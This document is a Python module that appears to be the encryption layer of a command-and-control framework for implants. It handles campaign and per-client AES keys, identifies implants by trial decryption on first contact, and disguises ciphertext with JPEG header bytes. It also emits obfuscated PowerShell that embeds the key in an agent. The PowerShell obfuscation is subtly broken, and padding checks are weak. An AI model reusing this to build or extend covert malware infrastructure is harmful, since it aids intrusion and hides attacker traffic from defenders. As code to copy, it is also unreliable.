import os
import base64
import json
import logging
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

logger = logging.getLogger(__name__)

class EncryptionPlugin:
    """Base class for encryption plugins"""
    
    def __init__(self):
        self.name = "base"
    
    def encrypt(self, data, key, **kwargs):
        """Encrypt data using the provided key"""
        raise NotImplementedError("Encryption method not implemented")
    
    def decrypt(self, data, key, **kwargs):
        """Decrypt data using the provided key"""
        raise NotImplementedError("Decryption method not implemented")
    
    def generate_key(self, **kwargs):
        """Generate a new encryption key"""
        raise NotImplementedError("Key generation not implemented")


class AESEncryptionPlugin(EncryptionPlugin):
    """AES-256-CBC encryption implementation"""
    
    def __init__(self):
        super().__init__()
        self.name = "aes"
    
    def encrypt(self, data, key, **kwargs):
        """
        Encrypt data with AES-256-CBC
        
        Args:
            data: Data to encrypt (string or bytes)
            key: Encryption key (bytes)
            
        Returns:
            Base64 encoded encrypted data (string)
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        # Generate a random IV
        iv = os.urandom(16)
        
        # Add padding manually (simple PKCS7-like padding)
        block_size = 16
        padding_length = block_size - (len(data) % block_size)
        padded_data = data + bytes([padding_length]) * padding_length
        
        # Encrypt
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        
        # Add JPEG header if requested
        if kwargs.get('add_jpeg_header', False):
            # Add JPEG header bytes (0xFF, 0xD8, 0xFF) at binary level
            jpeg_header = bytes([0xFF, 0xD8, 0xFF])
            result = jpeg_header + iv + ciphertext
        else:
            # Combine IV and ciphertext
            result = iv + ciphertext
        
        # Base64 encode
        return base64.b64encode(result).decode('utf-8')
    
    def decrypt(self, data, key, **kwargs):
        """
        Decrypt data encrypted with AES-256-CBC
        
        Args:
            data: Base64 encoded encrypted data (string)
            key: Decryption key (bytes)
            
        Returns:
            Decrypted data (string)
        """
        try:
            # Decode base64
            encrypted_bytes = base64.b64decode(data)
            
            # Check if there's a JPEG header and remove it
            offset = 0
            if len(encrypted_bytes) > 3 and encrypted_bytes[0] == 0xFF and encrypted_bytes[1] == 0xD8 and encrypted_bytes[2] == 0xFF:
                offset = 3
            
            # Extract the IV (16 bytes) and ciphertext
            iv = encrypted_bytes[offset:offset+16]
            ciphertext = encrypted_bytes[offset+16:]
            
            # Decrypt
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            padded_data = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Remove padding
            padding_length = padded_data[-1]
            if padding_length > 0 and padding_length <= 16:  # Validate padding
                data = padded_data[:-padding_length]
                return data.decode('utf-8')
            else:
                # Invalid padding, likely wrong key
                raise ValueError("Invalid padding in decrypted data")
                
        except Exception as e:
            logger.error(f"Decryption error: {str(e)}")
            raise
    
    def generate_key(self, **kwargs):
        """Generate a new AES-256 key"""
        return os.urandom(32)  # 256-bit key


class EncryptionService:
    """
    Centralized encryption service that manages encryption operations
    and client-specific keys
    """
    
    def __init__(self, campaign_folder):
        """
        Initialize the encryption service
        
        Args:
            campaign_folder: Path to the campaign folder
        """
        self.campaign_folder = campaign_folder
        self.plugins = {}
        self.client_keys = {}
        self.campaign_key = None
        self.default_provider = "aes"
        
        # Load plugins
        self.load_plugins()
        
        # Load campaign key and client keys
        self.load_keys()
    
    def load_plugins(self):
        """Load encryption plugins"""
        # Add AES plugin by default
        aes_plugin = AESEncryptionPlugin()
        self.plugins[aes_plugin.name] = aes_plugin
        logger.debug(f"Loaded encryption plugin: {aes_plugin.name}")
        
        # TODO: Load additional plugins dynamically if needed
    
    def load_keys(self):
        """Load encryption keys from campaign folder"""
        # Load campaign key
        keys_file = os.path.join(self.campaign_folder, "keys.json")
        if os.path.exists(keys_file):
            try:
                with open(keys_file, 'r') as f:
                    keys_data = json.load(f)
                    self.campaign_key = base64.b64decode(keys_data.get("primary", ""))
                    logger.info(f"Loaded campaign key from {keys_file}")
            except Exception as e:
                logger.error(f"Error loading campaign key: {e}")
                # Generate new key if loading fails
                self.campaign_key = self.generate_key()
                self.save_campaign_key()
        else:
            # Create new campaign key if it doesn't exist
            self.campaign_key = self.generate_key()
            self.save_campaign_key()
        
        # Load client keys if available
        client_keys_file = os.path.join(self.campaign_folder, "client_keys.json")
        if os.path.exists(client_keys_file):
            try:
                with open(client_keys_file, 'r') as f:
                    client_keys_data = json.load(f)
                    
                # We can't load the actual keys from file (they're not saved for security)
                # This just records which clients had unique keys
                logger.info(f"Found client key records for {len(client_keys_data)} clients")
            except Exception as e:
                logger.error(f"Error loading client keys info: {e}")
    
    def save_campaign_key(self):
        """Save the campaign key to disk"""
        keys_file = os.path.join(self.campaign_folder, "keys.json")
        keys_data = {
            "primary": base64.b64encode(self.campaign_key).decode('utf-8'),
            "created_at": self._current_timestamp(),
            "campaign": os.path.basename(self.campaign_folder).replace("_campaign", "")
        }
        
        os.makedirs(os.path.dirname(keys_file), exist_ok=True)
        with open(keys_file, 'w') as f:
            json.dump(keys_data, f, indent=2)
        
        logger.info(f"Saved campaign key to {keys_file}")
    
    def _current_timestamp(self):
        """Get current timestamp in ISO format"""
        from datetime import datetime
        return datetime.now().isoformat()
    
    def save_client_keys_info(self):
        """Save client key information to disk (not the actual keys)"""
        client_keys_file = os.path.join(self.campaign_folder, "client_keys.json")
        
        # Don't save actual keys, just record which clients have unique keys
        client_key_status = {}
        for client_id in self.client_keys:
            client_key_status[client_id] = {
                "has_unique_key": True,
                "assigned_at": self._current_timestamp()
            }
        
        os.makedirs(os.path.dirname(client_keys_file), exist_ok=True)
        with open(client_keys_file, 'w') as f:
            json.dump(client_key_status, f, indent=2)
        
        logger.info(f"Saved client key status to {client_keys_file}")
    
    def get_key(self, client_id=None):
        """
        Get the appropriate encryption key for a client
        
        Args:
            client_id: Client ID (optional, uses campaign key if None)
            
        Returns:
            Encryption key (bytes)
        """
        if client_id and client_id in self.client_keys:
            return self.client_keys[client_id]
        return self.campaign_key
    
    def encrypt(self, data, client_id=None, provider=None, **kwargs):
        """
        Encrypt data using the appropriate key and provider
        
        Args:
            data: Data to encrypt
            client_id: Client ID (optional)
            provider: Encryption provider name (optional)
            **kwargs: Additional arguments for the encryption plugin
            
        Returns:
            Encrypted data
        """
        if provider is None:
            provider = self.default_provider
            
        if provider not in self.plugins:
            raise ValueError(f"Encryption provider {provider} not found")
        
        key = self.get_key(client_id)
        plugin = self.plugins[provider]
        
        return plugin.encrypt(data, key, **kwargs)
    
    def decrypt(self, data, client_id=None, provider=None, **kwargs):
        """
        Decrypt data using the appropriate key and provider
        
        Args:
            data: Data to decrypt
            client_id: Client ID (optional)
            provider: Encryption provider name (optional)
            **kwargs: Additional arguments for the encryption plugin
            
        Returns:
            Decrypted data
        """
        if provider is None:
            provider = self.default_provider
            
        if provider not in self.plugins:
            raise ValueError(f"Encryption provider {provider} not found")
        
        key = self.get_key(client_id)
        plugin = self.plugins[provider]
        
        try:
            return plugin.decrypt(data, key, **kwargs)
        except Exception as e:
            # If client key fails, try campaign key as fallback
            if client_id and client_id in self.client_keys:
                logger.debug(f"Decryption with client key failed, trying campaign key: {e}")
                try:
                    return plugin.decrypt(data, self.campaign_key, **kwargs)
                except Exception as e2:
                    logger.error(f"Decryption with campaign key also failed: {e2}")
                    raise
            else:
                # No fallback available
                raise
    
    def identify_client_by_decryption(self, encrypted_data):
        """
        Identify a client by trying to decrypt with available client keys
        
        Args:
            encrypted_data: Encrypted data to attempt decryption
            
        Returns:
            tuple: (client_id, decrypted_data) or (None, None) if no key works
        """
        # Check if it's simple JSON (special case for first contact)
        try:
            simple_json = json.loads(encrypted_data)
            # If we can parse as JSON directly, it's likely first contact
            if isinstance(simple_json, dict) and not simple_json:
                logger.info("Identified first contact with empty JSON data")
                return None, encrypted_data
        except json.JSONDecodeError:
            # Not simple JSON, continue with key-based decryption
            pass
        
        # Try each client key
        for client_id, key in self.client_keys.items():
            try:
                plugin = self.plugins[self.default_provider]
                decrypted_data = plugin.decrypt(encrypted_data, key)
                
                # Try to verify it's valid data
                # Either valid JSON or readable text
                try:
                    json.loads(decrypted_data)
                except json.JSONDecodeError:
                    # Not JSON, but if we got this far, it's likely valid text
                    pass
                
                logger.info(f"Identified client {client_id} through key-based decryption")
                return client_id, decrypted_data
            except Exception:
                # Try next key
                continue
        
        # Try campaign key as fallback
        try:
            plugin = self.plugins[self.default_provider]
            decrypted_data = plugin.decrypt(encrypted_data, self.campaign_key)
            
            # Try to verify it's valid JSON
            try:
                json.loads(decrypted_data)
            except json.JSONDecodeError:
                # Not JSON, but might be valid text
                pass
                
            logger.info("Message decrypted with campaign key - likely from a new client")
            return None, decrypted_data
        except Exception as e:
            logger.debug(f"Campaign key decryption attempt failed: {e}")
        
        # If nothing worked
        logger.warning("Failed to identify client - no key could decrypt the data")
        return None, None
    
    def set_client_key(self, client_id, key=None):
        """
        Set a client-specific encryption key
        
        Args:
            client_id: Client ID
            key: Encryption key (generates new key if None)
            
        Returns:
            The encryption key
        """
        if key is None:
            key = self.generate_key()
            
        self.client_keys[client_id] = key
        self.save_client_keys_info()
        
        logger.info(f"Set client key for client {client_id}")
        return key
    
    def remove_client_key(self, client_id):
        """
        Remove a client-specific key and revert to using the campaign key
        
        Args:
            client_id: Client ID
            
        Returns:
            True if the key was removed, False if the client had no key
        """
        if client_id in self.client_keys:
            del self.client_keys[client_id]
            self.save_client_keys_info()
            logger.info(f"Removed client key for client {client_id}")
            return True
        return False
    
    def has_client_key(self, client_id):
        """
        Check if a client has a specific key
        
        Args:
            client_id: Client ID
            
        Returns:
            True if the client has a specific key, False otherwise
        """
        return client_id in self.client_keys
    
    def generate_key(self, provider=None):
        """
        Generate a new encryption key
        
        Args:
            provider: Encryption provider name (optional)
            
        Returns:
            New encryption key
        """
        if provider is None:
            provider = self.default_provider
            
        if provider not in self.plugins:
            raise ValueError(f"Encryption provider {provider} not found")
        
        plugin = self.plugins[provider]
        return plugin.generate_key()
    
    def get_powershell_key_code(self, obfuscate=True):
        """
        Generate PowerShell code for embedding the key in an agent
        
        Args:
            obfuscate: Whether to obfuscate the key
            
        Returns:
            PowerShell code for key initialization
        """
        key_b64 = base64.b64encode(self.campaign_key).decode('utf-8')
        
        if obfuscate:
            # Simple obfuscation - split the key into parts
            parts = []
            key_string = f"'{key_b64}'"
            chunk_size = len(key_string) // 3
            for i in range(0, len(key_string), chunk_size):
                parts.append(key_string[i:i+chunk_size])
            
            # Create obfuscated key loading code
            key_code = "$k = " + " + ".join([f"'{part}'" for part in parts]) + ";"
            key_code += "\n$key = [System.Convert]::FromBase64String($k);"
        else:
            # Simple direct key assignment
            key_code = f"$key = [System.Convert]::FromBase64String('{key_b64}');"
        
        return key_code